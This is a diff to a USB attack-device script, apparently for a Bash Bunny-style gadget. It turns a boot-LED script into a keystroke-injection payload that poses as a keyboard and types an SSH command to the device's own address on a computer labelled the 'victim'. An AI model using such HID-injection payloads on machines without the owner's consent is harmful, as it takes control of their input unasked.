@@ -1,5 +1,17 @@
 #!/bin/bash
 
-# Just turn on the two leds when the PI is booted. We now know it's ready for pushing the buttons
-LED GREEN ON
-LED RED ON
+# Maintainance Mode
+# Setup: rndis and hid
+# Stage1: connect victim to ssh server
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET STORAGE HID
+keyboardLayout="DE"
+export keyboardLayout
+LED STAGE1
+QUACK DELAY 2000
+QUACK STRING "ssh pi@172.16.64.1"
+QUACK ENTER
+LED FINISH
+QUACK DELAY 1000
+LED OFF
